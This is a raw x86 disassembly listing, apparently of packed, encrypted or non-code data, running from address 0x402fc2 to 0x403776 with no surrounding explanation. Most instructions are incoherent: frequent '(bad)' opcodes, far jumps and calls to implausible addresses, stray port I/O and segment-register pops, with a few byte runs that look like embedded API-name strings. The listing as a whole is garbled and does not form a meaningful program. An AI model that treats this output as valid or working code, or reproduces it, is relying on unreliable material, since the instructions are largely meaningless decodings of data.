  402fc2:	mov    al,ds:0x1672741f
  402fc7:	push   ecx
  402fc8:	push   esp
  402fc9:	add    BYTE PTR [edx],dh
  402fcb:	and    BYTE PTR [edi+0x41],al
  402fce:	xor    al,0x3c
  402fd0:	ins    DWORD PTR es:[edi],dx
  402fd1:	push   esi
  402fd2:	xor    DWORD PTR [esi+0x66],0x661f0458
  402fd9:	call   0x327bd8ff
  402fde:	repnz sbb eax,0x2f5a0f16
  402fe4:	or     DWORD PTR [ebx-0x7c],eax
  402fe7:	inc    ebp
  402fe8:	xchg   edi,eax
  402fe9:	jecxz  0x402fff
  402feb:	pop    ds
  402fec:	jbe    0x402ffc
  402fee:	mov    ebp,0xf9cc2789
  402ff3:	mov    esi,eax
  402ff5:	pop    edi
  402ff6:	xor    ah,bh
  402ff8:	adc    eax,edi
  402ffa:	adc    al,0x83
  402ffc:	sti    
  402ffd:	add    DWORD PTR [ebp+0x14],edi
  403000:	pop    es
  403001:	dec    ebx
  403002:	cmp    eax,ebx
  403004:	nop
  403005:	maskmovq mm4,(bad)
  403006:	mul    DWORD PTR [ebx+0x1cff9c7b]
  40300c:	xchg   edx,eax
  40300d:	sub    eax,ebx
  40300f:	cmp    edi,eax
  403011:	push   ds
  403012:	lods   al,BYTE PTR ds:[esi]
  403013:	add    edi,DWORD PTR [eax-0x2d77d475]
  403019:	push   0x4d
  40301b:	or     BYTE PTR [ecx+0x70199015],dl
  403021:	aas    
  403022:	inc    esi
  403023:	rcr    BYTE PTR [edi+0x51],cl
  403026:	lea    ebx,[edx+0x7b]
  403029:	jmp    0x3245:0x296289c2
  403030:	or     BYTE PTR [eax-0x5110f545],0x6
  403037:	mov    bl,0x48
  403039:	adc    al,0x3b
  40303b:	fadd   DWORD PTR [esi-0x74e5c2e3]
  403041:	test   al,0x3
  403043:	leave  
  403044:	sahf   
  403045:	push   es
  403046:	jg     0x402fcf
  403048:	mov    bl,0xd0
  40304a:	popf   
  40304b:	lock push ss
  40304d:	push   edi
  40304e:	cwde   
  40304f:	cli    
  403050:	(bad)  
  403051:	js     0x403054
  403053:	out    dx,al
  403054:	hlt    
  403055:	push   ebx
  403056:	mov    cl,BYTE PTR [edx+0x1]
  403059:	push   ecx
  40305a:	lea    esi,[ecx+edx*1-0x3e]
  40305e:	jl     0x403071
  403060:	push   es
  403061:	mov    edx,DWORD PTR [edi]
  403063:	popa   
  403064:	pop    ss
  403065:	xor    BYTE PTR [eax+0x7f128b8a],cl
  40306b:	xor    eax,0x8c7a205f
  403070:	test   dl,ch
  403072:	jg     0x40305b
  403074:	repnz pop DWORD PTR [ebx-0x2160f3c3]
  40307b:	fst    QWORD PTR [ecx]
  40307d:	scas   eax,DWORD PTR es:[edi]
  40307e:	pop    es
  40307f:	call   DWORD PTR ds:0x10b0c311
  403085:	call   0x8c55b391
  40308a:	sub    al,BYTE PTR [ebp+0x75e086f9]
  403090:	jmp    0x4030bd
  403092:	pop    esi
  403093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403094:	or     al,al
  403096:	data16 mov dl,BYTE PTR [esi+0x1]
  40309a:	cmp    al,0xba
  40309c:	and    eax,0x6ffda73c
  4030a1:	clc    
  4030a2:	or     esi,DWORD PTR [esi+edi*1+0x3c]
  4030a6:	or     al,0xf4
  4030a8:	cmp    al,0xd
  4030aa:	je     0x403108
  4030ac:	cmp    al,0xe
  4030ae:	je     0x403126
  4030b0:	cmp    al,0xf
  4030b2:	pop    eax
  4030b3:	test   dh,dl
  4030b5:	inc    BYTE PTR [edx+ebx*8]
  4030b8:	cmp    al,0x11
  4030ba:	push   cs
  4030bb:	mov    ecx,DWORD PTR [ebx+0x1845e36]
  4030c1:	int3   
  4030c2:	sub    eax,0x7fd3dddd
  4030c7:	or     al,ch
  4030c9:	and    DWORD PTR [ecx-0x77],ebp
  4030cc:	retf   0xcc17
  4030cf:	imul   edi,eax,0x26
  4030d2:	call   0x3233:0x778f0739
  4030d9:	push   esi
  4030da:	outs   dx,BYTE PTR ds:[esi]
  4030db:	es jg  0x40309f
  4030de:	push   es
  4030df:	es dec eax
  4030e1:	add    esi,DWORD PTR ds:0xebf3486c
  4030e7:	pop    edi
  4030e8:	push   ebp
  4030e9:	mov    ebp,edx
  4030eb:	mov    ebp,DWORD PTR [esi+0x54edc160]
  4030f1:	or     ch,BYTE PTR cs:[edx]
  4030f4:	add    ebx,DWORD PTR [esi+ebp*1-0x6]
  4030f8:	dec    esp
  4030f9:	mov    al,cs:0x9dd33912
  4030ff:	fstp   QWORD PTR [ebx-0x14a2177c]
  403105:	inc    ecx
  403106:	cmp    dh,BYTE PTR [ebx]
  403108:	mov    edx,esi
  40310a:	sub    edi,DWORD PTR [eax]
  40310c:	cmp    ah,BYTE PTR [edi+0x75]
  40310f:	dec    ebp
  403110:	lock sub eax,DWORD PTR [ebp+0x1c858d04]
  403117:	add    eax,0x1cccce6e
  40311c:	cmp    ah,BYTE PTR [ecx]
  40311e:	cmp    bh,BYTE PTR [eax-0x4df4140f]
  403124:	lock jo 0x4030e0
  403127:	or     ebp,0xb069e15
  40312d:	inc    edx
  40312e:	stc    
  40312f:	cmp    ecx,ebp
  403131:	out    dx,eax
  403132:	pop    ds
  403133:	add    ebx,DWORD PTR [ebp+ebp*1+0x19]
  403137:	adc    al,0x17
  403139:	add    DWORD PTR [ebp-0x7c],ebx
  40313c:	or     eax,0x418ac0ff
  403141:	add    DWORD PTR [ebp+0x6fbc087c],ecx
  403147:	cld    
  403148:	or     al,0x4f
  40314a:	clc    
  40314b:	push   ecx
  40314c:	pop    esp
  40314d:	js     0x403132
  40314f:	mov    edi,0xc1290406
  403154:	jle    0x403161
  403156:	mov    edx,eax
  403158:	add    eax,esi
  40315a:	mov    cl,0x2c
  40315c:	inc    edi
  40315d:	outs   dx,BYTE PTR ds:[esi]
  40315e:	or     eax,0x12566c7f
  403163:	mov    cl,BYTE PTR [edx]
  403165:	cmp    cl,0x56
  403168:	xor    DWORD PTR [eax],ecx
  40316a:	or     esi,DWORD PTR [ebp+edi*1+0x60]
  40316e:	outs   dx,BYTE PTR ds:[esi]
  40316f:	outs   dx,BYTE PTR ds:[esi]
  403170:	outs   dx,BYTE PTR ds:[esi]
  403171:	or     al,0x74
  403173:	dec    ecx
  403174:	or     eax,0x740e5574
  403179:	jo     0x4030fd
  40317b:	shl    DWORD PTR [ebx+esi*8+0x11108060],cl
  403182:	mov    BYTE PTR [edx],ah
  403184:	adc    al,0x15
  403186:	pop    es
  403187:	dec    esi
  403188:	shr    DWORD PTR [ebx],1
  40318a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40318b:	xor    BYTE PTR [eax+ebx*8-0x22],ah
  40318f:	adc    BYTE PTR [ecx],0xb
  403192:	xlat   BYTE PTR ds:[ebx]
  403193:	jmp    0x403212
  403195:	and    DWORD PTR [edx],ebp
  403197:	aas    
  403198:	cmp    DWORD PTR [edx+0x32],esi
  40319b:	in     al,0x6c
  40319d:	lea    esi,[esi]
  40319f:	jl     0x403159
  4031a1:	adc    BYTE PTR [ebx+0x3c],bl
  4031a4:	push   edi
  4031a5:	pop    esp
  4031a6:	sub    dl,dh
  4031a8:	lock (bad) 
  4031aa:	call   0x4cb530b1
  4031af:	jge    0x4031a0
  4031b1:	xchg   DWORD PTR [ebp-0x8],ebx
  4031b4:	or     DWORD PTR [edi+0x37],eax
  4031b7:	mov    al,0x58
  4031b9:	jmp    0x4031f6
  4031bb:	aas    
  4031bc:	add    dl,BYTE PTR cs:[ecx+0x39]
  4031c0:	lods   al,BYTE PTR ds:[esi]
  4031c1:	sbb    eax,0x9479ee33
  4031c6:	xor    BYTE PTR [edx],ah
  4031c8:	mov    ch,0x42
  4031ca:	sbb    al,0x88
  4031cc:	in     eax,0x30
  4031ce:	sbb    edx,DWORD PTR [ecx]
  4031d0:	ds and eax,0xab83f43a
  4031d6:	aas    
  4031d7:	cmp    esi,eax
  4031d9:	fs dec ebp
  4031db:	jne    0xd29a2bf5
  4031e1:	(bad)  
  4031e2:	and    eax,0x18661176
  4031e7:	add    edi,ebx
  4031e9:	rcr    DWORD PTR [edi+0x454f4523],0x8b
  4031f0:	ins    BYTE PTR es:[edi],dx
  4031f1:	and    al,0x14
  4031f3:	mov    cl,BYTE PTR [edi]
  4031f5:	in     eax,dx
  4031f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031f7:	push   edx
  4031f8:	test   eax,0x6152431c
  4031fd:	jge    0x403216
  4031ff:	adc    dh,BYTE PTR [edx]
  403201:	enter  0x9c91,0x58
  403205:	out    dx,eax
  403206:	stos   DWORD PTR es:[edi],eax
  403207:	lds    eax,FWORD PTR [ecx+0x16]
  40320a:	jmp    0x403266
  40320c:	cmp    BYTE PTR [ebp+0x75],cl
  40320f:	out    dx,al
  403210:	sub    al,0x38
  403212:	mov    al,0x78
  403214:	enter  0x9b93,0x32
  403218:	in     al,0xeb
  40321a:	jp     0x4031c3
  40321c:	push   cs
  40321d:	sub    cl,BYTE PTR [ebp+0x3b]
  403220:	std    
  403221:	adc    BYTE PTR es:[eax],dl
  403224:	les    cx,DWORD PTR [edi+0x7]
  403228:	scas   eax,DWORD PTR es:[edi]
  403229:	jo     0x40325a
  40322b:	xor    BYTE PTR [ecx],bh
  40322d:	add    bh,BYTE PTR [ecx]
  40322f:	es or  bh,bh
  403232:	ja     0x403238
  403234:	sti    
  403235:	vpmaxsw xmm6,xmm7,xmm6
  403239:	add    ebx,DWORD PTR [edi]
  40323b:	add    esi,DWORD PTR [edi]
  40323d:	inc    eax
  40323e:	jmp    0xf1f9:0x892f45eb
  403245:	mov    BYTE PTR [edi],al
  403247:	call   0x3870:0x147e3bd
  40324e:	add    al,BYTE PTR [ebx]
  403250:	je     0x403258
  403252:	cmp    ch,ah
  403254:	push   eax
  403255:	js     0x4032c5
  403257:	xchg   edx,eax
  403258:	xor    ecx,ebx
  40325a:	inc    edx
  40325b:	sbb    al,0x14
  40325d:	daa    
  40325e:	popa   
  40325f:	inc    edi
  403260:	xor    BYTE PTR [eax],bl
  403262:	data16 adc ch,BYTE PTR [ebx]
  403265:	in     al,dx
  403266:	pop    ebx
  403267:	lods   al,BYTE PTR ds:[esi]
  403268:	nop
  403269:	xor    ah,al
  40326b:	clc    
  40326c:	shl    BYTE PTR [eax+0x65805711],0xef
  403273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403274:	scas   eax,DWORD PTR es:[edi]
  403275:	(bad)  
  403276:	mul    DWORD PTR [esp]
  403279:	mov    ecx,eax
  40327b:	in     eax,0x64
  40327d:	and    al,0xc
  40327f:	add    DWORD PTR [edx],edx
  403281:	or     DWORD PTR [ebx],edx
  403283:	loopne 0x4032d4
  403285:	jb     0x403298
  403287:	retf   0x5959
  40328a:	call   0xf061eae7
  40328f:	pop    ebx
  403290:	pop    ss
  403291:	xchg   esp,eax
  403292:	cmp    al,dl
  403294:	dec    eax
  403295:	pop    es
  403296:	push   DWORD PTR [ebp+0x8]
  403299:	push   cs
  40329a:	pop    ds
  40329b:	(bad)  
  40329c:	cmp    BYTE PTR [ebx],bh
  40329e:	xlat   BYTE PTR ds:[ebx]
  40329f:	cmc    
  4032a0:	mov    ds,WORD PTR [ebp+0x478ee93a]
  4032a6:	push   cs
  4032a7:	(bad)  
  4032a8:	in     al,0xef
  4032aa:	dec    ebp
  4032ab:	xor    BYTE PTR [edx+edi*1+0x10],cl
  4032af:	sahf   
  4032b0:	lods   al,BYTE PTR ds:[esi]
  4032b1:	sub    ch,BYTE PTR [ebp+0x46]
  4032b4:	xor    esp,DWORD PTR [ebx+0xe]
  4032b7:	call   0x5658be14
  4032bc:	int3   
  4032bd:	sbb    eax,0x541b815d
  4032c2:	pop    es
  4032c3:	mov    al,0x4
  4032c5:	xor    eax,0xff454837
  4032ca:	pop    ss
  4032cb:	in     al,0xb7
  4032cd:	in     al,0x3a
  4032cf:	mov    eax,ds:0x7d83ff33
  4032d4:	call   0xf6bf4059
  4032d9:	pop    esp
  4032da:	ret    0x6d83
  4032dd:	ss cmp BYTE PTR fs:[ecx],dl
  4032e1:	clc    
  4032e2:	movzx  eax,BYTE PTR [eax+0x1]
  4032e6:	add    DWORD PTR [ecx],eax
  4032e8:	fwait
  4032e9:	jle    0x4032f6
  4032eb:	pop    ds
  4032ec:	jo     0x403284
  4032ee:	push   eax
  4032ef:	push   es
  4032f0:	sub    eax,ecx
  4032f2:	push   cs
  4032f3:	nop
  4032f4:	fmulp  st(0),st
  4032f6:	sbb    al,0x7d
  4032f8:	cmp    dl,BYTE PTR [eax]
  4032fa:	mov    edi,0xeef79804
  4032ff:	mov    ch,0xec
  403301:	pop    edi
  403302:	sbb    esi,DWORD PTR [esi-0x6f]
  403305:	js     0x403342
  403307:	lock je 0x4032c9
  40330a:	and    DWORD PTR [eax],0x8
  40330d:	mov    ds:0xbb7d2b08,eax
  403312:	jg     0x4032ae
  403314:	cmp    DWORD PTR [eax],0x1
  403317:	jne    0x403355
  403319:	push   cs
  40331a:	push   eax
  40331b:	in     al,0x3b
  40331d:	sti    
  40331e:	jle    0x40333f
  403320:	lahf   
  403321:	cld    
  403322:	aaa    
  403323:	sbb    DWORD PTR [ebp+0x19],ebx
  403326:	das    
  403327:	rcl    BYTE PTR [edi+ecx*1-0x51],0xd6
  40332c:	add    eax,edx
  40332e:	mov    ecx,edi
  403330:	sub    ecx,ebx
  403332:	add    BYTE PTR [ecx-0xfe0e850],0x8d
  403339:	dec    edx
  40333a:	test   BYTE PTR [edi-0x11],dh
  40333d:	inc    ecx
  40333e:	mov    bl,0x31
  403340:	inc    esi
  403341:	in     al,0x7e
  403343:	jmp    0x4033a8
  403345:	push   esi
  403346:	call   DWORD PTR [eax-0x1307ad7]
  40334c:	fist   WORD PTR [eax-0xf8276de]
  403352:	cmp    ebx,DWORD PTR [ebp-0x10]
  403355:	jge    0x40335a
  403357:	mov    DWORD PTR [eax],ecx
  403359:	cdq    
  40335a:	sub    al,0xb
  40335c:	(bad)  
  40335e:	mov    ecx,0x33a58e9e
  403363:	leave  
  403364:	dec    esp
  403365:	sbb    al,0x30
  403367:	fwait
  403368:	dec    ecx
  403369:	fs push esp
  40336b:	ss push eax
  40336d:	inc    eax
  40336e:	mov    ds:0x55f98d1,al
  403373:	mov    esi,0x42e0bb4d
  403378:	dec    ebp
  403379:	push   esi
  40337a:	into   
  40337b:	mov    edx,DWORD PTR [ebp-0x7e]
  40337e:	cmp    edi,DWORD PTR [edx+0x30]
  403381:	int3   
  403382:	inc    ebp
  403383:	sub    ecx,DWORD PTR [edx-0x30]
  403386:	jle    0x403398
  403388:	sub    BYTE PTR [ecx+0x372f63b],al
  40338e:	mov    DWORD PTR [eax],ebx
  403390:	fld    TBYTE PTR [ebx+ebp*8-0x2]
  403394:	adc    ebx,edx
  403396:	sub    edx,edi
  403398:	mov    cl,0xc6
  40339a:	or     bh,al
  40339c:	add    ebx,DWORD PTR [esi]
  40339e:	mov    ch,0xe6
  4033a0:	mov    ebx,0xf47b70d1
  4033a5:	add    DWORD PTR [esi+0x28],edi
  4033a8:	or     BYTE PTR ds:[edi+edi*8],al
  4033ac:	(bad)  
  4033ad:	dec    ebx
  4033ae:	fs sbb al,0x43
  4033b1:	add    al,0xed
  4033b3:	aaa    
  4033b4:	shl    BYTE PTR [ebx],1
  4033b6:	mul    BYTE PTR [esi+ebp*2]
  4033b9:	lea    eax,[eax+esi*4]
  4033bc:	shl    ah,0x97
  4033bf:	inc    edi
  4033c0:	ret    0xfe1e
  4033c3:	cmp    DWORD PTR [eax],eax
  4033c5:	inc    esi
  4033c6:	dec    ebx
  4033c7:	jne    0x4033b0
  4033c9:	aad    0x9e
  4033cb:	xchg   esi,eax
  4033cc:	js     0x4033e3
  4033ce:	not    esp
  4033d0:	mov    esp,ebp
  4033d2:	retf   
  4033d3:	rcl    BYTE PTR [ebx+eax*4-0x2a],0x4
  4033d8:	inc    ecx
  4033d9:	jg     0x40337c
  4033db:	mov    eax,ds:0x33afaea0
  4033e0:	pop    ds
  4033e1:	lock jmp FWORD PTR [edx+0x26]
  4033e5:	mov    eax,ds:0x75f849f0
  4033ea:	daa    
  4033eb:	mov    esi,0xb9e054f5
  4033f0:	lock sub BYTE PTR [esi+edx*2],0xfc
  4033f5:	inc    esp
  4033f6:	pop    es
  4033f7:	enter  0x2121,0x16
  4033fb:	mov    esi,DWORD PTR [ebp+ecx*2-0x7c]
  4033ff:	test   esi,ebp
  403401:	or     BYTE PTR [esi],cl
  403403:	sbb    BYTE PTR [eax+0x61],al
  403406:	cld    
  403407:	dec    ebp
  403408:	inc    esp
  403409:	imul   edx,esp,0x14
  40340c:	push   cs
  40340d:	dec    ebx
  40340e:	inc    eax
  40340f:	push   eax
  403410:	push   edx
  403411:	mov    edx,ecx
  403413:	inc    DWORD PTR [ebx-0x8]
  403416:	jle    0x403440
  403418:	pusha  
  403419:	jg     0x40344a
  40341b:	pop    edx
  40341c:	pop    eax
  40341d:	out    dx,al
  40341e:	(bad)  
  40341f:	xor    BYTE PTR [edx+0x1c],ch
  403422:	push   0xa41585fc
  403427:	pop    ecx
  403428:	xor    al,0x81
  40342a:	mov    ds:0xbeebf1e0,eax
  40342f:	or     BYTE PTR [ebp+0x6],dh
  403432:	std    
  403433:	ret    0x7eb1
  403436:	push   ebp
  403437:	sub    eax,0x81271cf2
  40343c:	(bad)  
  40343d:	clc    
  40343e:	sub    cl,BYTE PTR [edx+0x76]
  403441:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403442:	icebp  
  403443:	fadd   DWORD PTR [ebx+0x682b8e7b]
  403449:	add    eax,0xc7f0335a
  40344e:	cli    
  40344f:	fisttp QWORD PTR [ebx-0x743b02bd]
  403455:	les    esi,FWORD PTR [edx+0x6a023b5a]
  40345b:	loop   0x40349a
  40345d:	fdivr  DWORD PTR [eax+0x5c6d84d4]
  403463:	imul   esi,DWORD PTR [edi+0x10438934],0xa
  40346a:	adc    BYTE PTR [esi+0x8],dh
  40346d:	pop    esp
  40346e:	or     al,0xbc
  403470:	push   edx
  403471:	dec    eax
  403472:	iret   
  403473:	cli    
  403474:	mov    esi,esp
  403476:	mov    eax,ds:0xae24b030
  40347b:	hlt    
  40347c:	pop    esi
  40347d:	push   es
  40347e:	stos   BYTE PTR es:[edi],al
  40347f:	sub    ebx,DWORD PTR [edx]
  403481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403482:	popa   
  403483:	dec    ecx
  403484:	test   al,0xac
  403486:	sub    ebx,esp
  403488:	mov    ds:0xcf846e3,eax
  40348d:	jne    0x40349a
  40348f:	and    eax,0x9c8b443b
  403494:	or     eax,0x63a57f89
  403499:	sbb    ebx,esi
  40349b:	aad    0x8b
  40349d:	sti    
  40349e:	mov    eax,edi
  4034a0:	pop    edx
  4034a1:	adc    bl,BYTE PTR [ebx]
  4034a3:	mov    bh,0x9
  4034a5:	das    
  4034a6:	push   ecx
  4034a7:	xchg   esi,eax
  4034a8:	lea    esi,[ebp-0x4]
  4034ab:	pop    esp
  4034ac:	dec    ebx
  4034ad:	loop   0x403430
  4034af:	or     DWORD PTR [eax+0x30928403],esp
  4034b5:	sti    
  4034b6:	dec    ebp
  4034b7:	ret    0x188a
  4034ba:	push   ss
  4034bb:	add    eax,0x755cfb80
  4034c0:	jmp    0x544e84dd
  4034c5:	nop
  4034c6:	retf   
  4034c7:	pop    DWORD PTR [eax]
  4034c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034ca:	pop    ebp
  4034cb:	jmp    0x686a:0xff88c41d
  4034d2:	mov    eax,0xf774404d
  4034d7:	adc    bl,BYTE PTR [edx]
  4034d9:	add    esp,ecx
  4034db:	xor    eax,DWORD PTR [eax+ebp*2-0x38]
  4034df:	push   ds
  4034e0:	add    al,0x8f
  4034e2:	push   ds
  4034e3:	lods   eax,DWORD PTR ds:[esi]
  4034e4:	in     eax,0xd4
  4034e6:	xchg   edx,eax
  4034e7:	inc    edi
  4034e8:	xor    bh,cl
  4034ea:	push   edx
  4034eb:	pop    esp
  4034ec:	add    ebp,edi
  4034ee:	test   DWORD PTR [ebp-0xf7af86],esp
  4034f4:	pop    esi
  4034f5:	sbb    BYTE PTR [ebx+0x7b],0x74
  4034f9:	cld    
  4034fa:	inc    esp
  4034fb:	clc    
  4034fc:	push   eax
  4034fd:	sub    esp,DWORD PTR [edi-0x80]
  403500:	mov    ebx,0x3dd2fdf6
  403505:	test   al,0x1a
  403507:	cmp    BYTE PTR [eax],0xf6
  40350a:	inc    ecx
  40350b:	vmread DWORD PTR [ecx],eax
  40350e:	pop    esp
  40350f:	push   0xcc5771d0
  403514:	daa    
  403515:	jle    0x40352f
  403517:	into   
  403518:	add    bl,BYTE PTR [edi-0x13eca02c]
  40351e:	adc    DWORD PTR [ecx+0x330d1a44],0xfffffff0
  403525:	retf   
  403526:	push   ds
  403527:	xor    BYTE PTR [eax+eax*2+0x970f52f],dh
  40352e:	addr16 sub eax,0x917ef6d8
  403534:	xchg   edx,eax
  403535:	sub    ebx,DWORD PTR [ebp-0x4]
  403538:	lea    eax,[ebx+0x1]
  40353b:	shr    ecx,cl
  40353d:	loope  0x403560
  40353f:	mov    edx,0x8388ed69
  403544:	(bad)  
  403545:	jge    0x403533
  403547:	sub    edi,esi
  403549:	inc    esi
  40354a:	bound  esi,QWORD PTR [eax-0x7b]
  40354d:	sbb    al,bl
  40354f:	inc    eax
  403550:	cmp    eax,0xd996b06e
  403555:	jbe    0x4034f2
  403557:	test   eax,0x71465747
  40355c:	xor    dh,BYTE PTR [ebp-0x74]
  40355f:	outs   dx,BYTE PTR ds:[esi]
  403560:	or     eax,0xfeaaced7
  403565:	fwait
  403566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403567:	push   es
  403568:	and    DWORD PTR [esp+esi*2],0x7b
  40356c:	push   esi
  40356d:	cmc    
  40356e:	pop    ds
  40356f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403570:	jmp    0x2616d1b4
  403575:	add    al,0x8d
  403577:	push   ebx
  403578:	add    DWORD PTR [ebp+0xc4cfddb],edi
  40357e:	mov    eax,ds:0x84c65c7f
  403583:	sbb    eax,0x1db85c65
  403588:	sub    eax,ebx
  40358a:	dec    eax
  40358b:	push   eax
  40358c:	jno    0x4035fb
  40358e:	sbb    esi,DWORD PTR [esi-0x40bf42ad]
  403594:	jg     0x4035d6
  403596:	xor    DWORD PTR [esi-0x3f],ecx
  403599:	adc    ebx,DWORD PTR [edx]
  40359b:	in     al,dx
  40359c:	rol    DWORD PTR [ebp+0x44c94e49],0xac
  4035a3:	xchg   BYTE PTR [ecx-0x6a800532],al
  4035a9:	nop
  4035aa:	adc    edx,DWORD PTR [eax+0x6e72656b]
  4035b0:	gs ins BYTE PTR es:[edi],dx
  4035b2:	xor    esi,DWORD PTR [edx]
  4035b4:	cs fs ins BYTE PTR es:[edi],dx
  4035b7:	ins    BYTE PTR es:[edi],dx
  4035b8:	push   ebx
  4035b9:	jmp    0x483f6dbd
  4035be:	gs je  0x40360d
  4035c1:	outs   dx,DWORD PTR ds:[esi]
  4035c2:	outs   dx,BYTE PTR ds:[esi]
  4035c3:	addr16 push eax
  4035c5:	popa   
  4035c6:	je     0x403630
  4035c8:	dec    esi
  4035c9:	popa   
  4035ca:	ins    DWORD PTR es:[edi],dx
  4035cb:	mov    dh,0x0
  4035cd:	sub    edx,DWORD PTR [esi]
  4035cf:	out    0x8b,eax
  4035d1:	scas   eax,DWORD PTR es:[edi]
  4035d2:	fdiv   st(6),st
  4035d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035d5:	push   ecx
  4035d6:	ds sti 
  4035d8:	dec    edi
  4035d9:	mov    ecx,0xc4adeddf
  4035de:	mov    BYTE PTR [ebp-0x12],0x22
  4035e2:	into   
  4035e3:	push   0x85669319
  4035e8:	shr    al,1
  4035ea:	add    BYTE PTR [eax+eiz*1],ah
  4035ed:	push   eax
  4035ee:	add    DWORD PTR [esi],ebp
  4035f0:	cmp    edx,ebx
  4035f2:	sbb    edx,DWORD PTR [edx+0x322023b]
  4035f8:	pop    eax
  4035f9:	enter  0x77c0,0x3c
  4035fd:	outs   dx,DWORD PTR ds:[esi]
  4035fe:	enter  0xe10b,0x9
  403602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403603:	loopne 0x403653
  403605:	cmp    BYTE PTR [esi],bh
  403607:	or     bh,cl
  403609:	pusha  
  40360a:	xor    BYTE PTR [ecx+ecx*1-0x46],0x1f
  40360f:	push   ds
  403610:	cmp    al,0x60
  403612:	adc    edx,0xeee8c454
  403618:	inc    ecx
  403619:	shr    DWORD PTR [ebp-0x6f],cl
  40361c:	into   
  40361d:	sti    
  40361e:	int    0x24
  403620:	aas    
  403621:	iret   
  403622:	pop    esp
  403623:	shl    BYTE PTR [esi+0x30],0xb0
  403627:	cmp    eax,DWORD PTR [ecx+ecx*4]
  40362a:	push   es
  40362b:	repnz add BYTE PTR [esi],cl
  40362e:	popa   
  40362f:	cmp    edx,esp
  403631:	mov    cl,0xe7
  403633:	dec    esi
  403634:	inc    ebx
  403635:	sbb    eax,0xb071ce41
  40363a:	sti    
  40363b:	aas    
  40363c:	(bad)  
  40363e:	sti    
  40363f:	scas   eax,DWORD PTR es:[edi]
  403640:	imul   ebx,edx,0x6a
  403643:	add    eax,0x1903f3ac
  403648:	in     al,0x25
  40364a:	mov    esp,0xbd80db33
  40364f:	inc    ecx
  403650:	xor    eax,0xcc87c27d
  403655:	stc    
  403656:	outs   dx,BYTE PTR ds:[esi]
  403657:	jge    0x40364c
  403659:	test   al,0xa
  40365b:	mov    ebx,0xaaf3b48
  403660:	out    dx,al
  403661:	push   ds
  403662:	jmp    0x17d622e2
  403667:	add    eax,0xf2850158
  40366c:	xor    al,0xeb
  40366e:	add    ebx,DWORD PTR [edx+0x3766dbe4]
  403674:	adc    eax,0x742ee47a
  403679:	or     eax,DWORD PTR [edi+0x3b]
  40367c:	sbb    dh,BYTE PTR [ebp-0x16]
  40367f:	adc    eax,0x1811f770
  403684:	in     eax,0xff
  403686:	inc    edx
  403687:	xchg   esp,eax
  403688:	out    dx,al
  403689:	pusha  
  40368a:	mov    ds,WORD PTR [edi]
  40368c:	out    0xe4,al
  40368e:	sub    edx,eax
  403690:	inc    ebx
  403691:	ret    0x76b5
  403694:	sub    esi,DWORD PTR [eax+0x2]
  403697:	or     esp,DWORD PTR ds:0x36cb4544
  40369d:	clc    
  40369e:	(bad)  
  40369f:	in     al,dx
  4036a0:	dec    eax
  4036a1:	jne    0x403715
  4036a3:	or     eax,0x772f6c74
  4036a8:	xor    bl,BYTE PTR [esp+0x17]
  4036ac:	repz ss fbstp TBYTE PTR ss:[ecx+0x2a]
  4036b2:	pop    si
  4036b4:	jae    0x403641
  4036b6:	ret    
  4036b7:	iret   
  4036b8:	push   ebx
  4036b9:	outs   dx,DWORD PTR ds:[esi]
  4036ba:	data16 ja 0x403641
  4036bd:	dec    ecx
  4036be:	clc    
  4036bf:	je     0x403738
  4036c1:	popa   
  4036c2:	jb     0x403729
  4036c4:	dec    edi
  4036c5:	retf   0x6163
  4036c8:	ins    BYTE PTR es:[edi],dx
  4036c9:	cmp    eax,0x65d9ab09
  4036ce:	jae    0x403702
  4036d0:	aaa    
  4036d1:	xchg   eax,edi
  4036d3:	or     DWORD PTR [edi-0x54],ebx
  4036d6:	inc    ebp
  4036d7:	ret    
  4036d8:	inc    eax
  4036d9:	ins    BYTE PTR es:[edi],dx
  4036da:	xlat   BYTE PTR ds:[ebx]
  4036db:	inc    eax
  4036dc:	mov    WORD PTR [ebx+esi*1-0x4700e50f],es
  4036e3:	mov    al,0x40
  4036e5:	push   0xffffff80
  4036e7:	lahf   
  4036e8:	and    edx,DWORD PTR ds:0x9310cb34
  4036ee:	xchg   ecx,eax
  4036ef:	add    BYTE PTR [esi-0xec5c4c],ch
  4036f5:	or     BYTE PTR [eax-0xf2f7878],cl
  4036fb:	ret    0x34a1
  4036fe:	stc    
  4036ff:	loopne 0x4036fe
  403701:	adc    esp,esi
  403703:	je     0x40372a
  403705:	or     edi,DWORD PTR [ebx]
  403707:	(bad)  
  403708:	jne    0x403725
  40370a:	das    
  40370b:	sub    eax,0xe413ee70
  403710:	gs mov edx,0xebb13499
  403716:	inc    ecx
  403717:	lods   eax,DWORD PTR ds:[esi]
  403718:	adc    edi,DWORD PTR [edx+0x3f1a1240]
  40371e:	pop    esp
  40371f:	ss pop ebp
  403721:	add    DWORD PTR [eax+0x7e72d682],esp
  403727:	inc    ebx
  403728:	addr16 sbb al,0xc8
  40372b:	cmp    BYTE PTR [ebx+0x1a],bh
  40372e:	push   0xcfe06a22
  403733:	dec    ebp
  403734:	lods   al,BYTE PTR ds:[esi]
  403735:	push   esi
  403736:	add    ch,BYTE PTR [ecx+0xb]
  403739:	xor    DWORD PTR [ebx+0x75],ebp
  40373c:	retf   0x9d59
  40373f:	push   esi
  403740:	and    al,0x38
  403742:	jns    0x403783
  403744:	je     0x40371f
  403746:	call   0x7c201775
  40374b:	cmp    DWORD PTR [edi+0x43d35153],esp
  403751:	jo     0x403758
  403753:	cli    
  403754:	loop   0x403718
  403756:	js     0x40378a
  403758:	dec    esp
  403759:	inc    eax
  40375a:	add    al,0xbb
  40375c:	or     ah,BYTE PTR [edi]
  40375e:	pop    esp
  40375f:	cmp    BYTE PTR [ebx+eax*8+0x7571f656],al
  403766:	(bad)  
  403767:	mov    bh,0x2e
  403769:	mov    eax,0x30ec414b
  40376e:	mov    ds:0x492cff0d,eax
  403773:	ja     0x403735
  403775:	in     al,dx
  403776:	mov    ch,0xfd
